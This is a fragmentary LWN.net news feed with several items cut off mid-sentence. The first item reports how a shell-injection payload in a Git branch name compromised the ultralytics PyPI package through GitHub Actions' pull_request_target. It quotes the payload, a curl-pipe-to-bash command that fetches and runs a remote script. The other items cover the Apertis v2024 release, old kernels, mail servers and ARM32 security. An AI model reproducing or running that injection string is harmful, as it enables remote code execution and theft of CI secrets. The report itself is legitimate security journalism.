            <title>Abusing Git branch names to compromise a PyPI package</title>
            <link>https://lwn.net/Articles/1001215/</link>
            <description><![CDATA[<p>
A compromised release was uploaded to PyPI after a project automatically processed a pull request with a flawed script.
The GitHub account 
<a href="https://github.com/openimbot">
"OpenIM Robot"</a>
(which appears to be controlled by
<a href="https://nsddd.top/">Xinwei Xiong</a>) opened
<a href="https://github.com/ultralytics/ultralytics/pull/18018">a pull request</a> for the 
<a href="https://pypi.org/project/ultralytics/">
ultralytics</a>
Python package. The pull request included a suspicious Git branch name:
</p>

<blockquote class="bq">
openimbot:$({curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/12e4f54ca3f2e69bcdc900d1c6e16642ca8ae545/file.sh}${IFS}|${IFS}bash)
</blockquote>

<p>
Unfortunately, ultralytics uses the
<a href="https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#pull_request_target"><tt>pull_request_target</tt></a> GitHub Action trigger to automate some of its continuous integration tasks. This runs a script from the base branch of the repository, which has access to the repository's secrets — but that script was vulnerable to a shell injection attack from the branch name of the pull request. The injected script appears to have used the credentials it had access to in order to compromise a later release uploaded to PyPI to include a cryptocurrency miner. It is hard to be sure of the details, because GitHub has already pulled the malicious script.
</p>

<p>
This problem has been
<a href="https://nathandavison.com/blog/github-actions-and-the-threat-of-malicious-pull-requests">known</a> for several years, but this event may serve as a good reminder to be careful with automated access to important secrets.

            <title>Apertis v2024 released</title>
            <link>https://lwn.net/Articles/1001013/</link>
            <description><![CDATA[<a href="https://www.apertis.org/">Apertis</a> is a Collabora-developed
Debian derivative distribution designed to be incorporated into electronic
devices; the <a
href="https://www.collabora.com/news-and-blog/news-and-events/apertis-v2024-the-new-bookworm-based-release-for-industrial-embedded-devices.html">v2024
release</a> is now available.  It is now based on the Bookworm release, and
includes support for Podman, <a href="https://onnxruntime.ai/">ONNX
Runtime</a>, OP-TEE, and more.
<p>
<blockquote class="bq">
	Apertis relies on the Debian Free Software Guidelines to ensure all
	software shipped is open source or, in limited cases, at least
	freely distributable. However, for some customers this is not
	enough to be able to adopt OSS solutions as in their evaluations
	some provisions in common licenses like the GPL-3 are at odds with
	regulatory constraints they are subject to. Apertis does not set to
	solve this decades-long debate, and instead its goal is to increase
	the adoption of modern, maintained OSS solutions in markets where
	this has historically been a challenge. To enable this, Apertis
	supports avoiding the use of any software under some licenses (like
	the [GPL v3.0 license family) on target images, while still making
	them fully available for development and for customers that do not
	share those licensing concerns. To avoid these licenses, Apertis
	uses more modern alternatives instead of relying on outdated and
	unmaintained pre-GPL-3 versions. For instance, coreutils and
	findutils (GPL-3+) are replaced in Apertis by rust-coreutils and
	rust-findutils.

6.11.11 and 4.19.325 are the last kernels in those series, "<q>please move
off to a newer kernel version</q>".  In the 4.19.325 release notice, he has
a rather longer-than-usual message, including:

<blockquote class="bq">
As a "fun" proof that this one is finished (and that any company saying
they care about it really should have their statements validated with
facts), I looked at the "unfixed" CVEs from this kernel release.
Currently it is a list 983 CVEs long, too long to list here.
<p>
You can verify it yourself by cloning the vulns.git repo at
git.kernel.org and running:
<pre>
	./scripts/strak v4.19.325
</pre>
Note, this does NOT count the hardware CVEs which kernel.org does not
track, and many are sill unfixed in this kernel branch.

            <description><![CDATA[<p>The most common piece of advice given to users who ask about
running their own mail server is <em><a
href="https://lwn.net/Articles/987566/">don't</a></em>. Setting up
and securing a mail server in&nbsp;2024 is not for the faint of heart, nor
for anyone without copious spare time. Spammers want to flood inboxes
with ads for questionable supplements, attackers want to abuse servers
to send spam (or worse), and getting the big providers to accept mail
from small servers is a constant uphill battle. Michael W. Lucas,
however, encourages users to thumb their nose at the "<q>Email
Empire</q>", and declare email independence. His self-published book,
<em><a href="https://mwl.io/nonfiction/tools#ryoms">Run Your Own Mail
Server</a></em>, provides a manual (and manifesto) for users who are
interested in the challenge.</p>]]></description>

            <link>https://lwn.net/Articles/998221/</link>
            <description><![CDATA[The kernel's loadable-module facility allows code to be loaded into (and
sometimes removed from) a running kernel.  Among other things, loadable
modules make it possible to run a kernel with only the subsystems needed
for the system's hardware and workload.  Loadable modules can also make it
easy for out-of-tree code to access parts of the kernel that developers
would prefer to keep private; this has led to <a
href="https://lwn.net/Kernel/Index/#Modules-Exported_symbols">many discussions</a> in the
past.  The topic has returned to the kernel's mailing lists with two
different patch sets aimed at further tightening the restrictions applied
to loadable modules.]]></description>

            <description><![CDATA[Direct memory access (DMA) I/O is simple in concept: a peripheral device
moves data directly to or from memory while the CPU is busy doing other
things.  As is so often the case, DMA is rather more complicated in
practice, and the kernel has developed a complicated internal API to
support it.  It turns out that the DMA API, as it exists now, can affect
the performance of some high-bandwidth devices.  In an effort to address
that problem, Leon Romanovsky is making the API even more complex with <a

            <title>Walleij: New ARM32 Security Features in v6.10</title>
            <link>https://lwn.net/Articles/1000727/</link>
            <description><![CDATA[Linus Walleij <a
href="https://people.kernel.org/linusw/new-arm32-security-features-in-v6-10">writes
about a pair of security features for 32-bit Arm systems</a>; these landed
in 6.10, but, he says, have now stabilized to the point that distributors
may want to enable them.
<p>
<blockquote class="bq">
	PAN is an abbreviation for the somewhat grammatically incorrect
	Privileged Access Never. [...]
<p>
	For modern ARM32 systems with large memories configured to use LPAE
	nothing like PAN was available: this version of the MMU simply did
	not implement a PAN option.
<p>
	As of the patch originally developed by Catalin Marinas, we deploy
	a scheme that will use the fact that LPAE has two separate
	translation table base registers (TTBR:s): one for userspace
	(TTBR0) and one for kernelspace (TTBR1).
